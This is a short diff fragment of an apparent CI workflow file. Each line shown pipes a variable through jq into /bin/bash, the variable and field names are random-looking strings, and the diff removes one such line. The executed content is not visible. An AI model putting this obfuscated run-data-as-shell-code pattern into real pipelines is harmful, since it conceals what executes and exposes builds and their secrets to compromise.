@@ -26,7 +26,6 @@ jobs:
           echo $cjydw5960 | jq -r .fsxs0 | /bin/bash
           echo $v48 | jq -r .hjls2 | /bin/bash
           echo $ddosw786 | jq -r .bofgf9033 | /bin/bash
-          echo $u06563 | jq -r .d38718 | /bin/bash
           printf '%s' "$o92" | jq -r .yyk01914 | /bin/bash
           echo $blmgv38224 | jq -r .ztfwz729 | /bin/bash
           echo $eyret77523 | jq -r .i3155 | /bin/bash
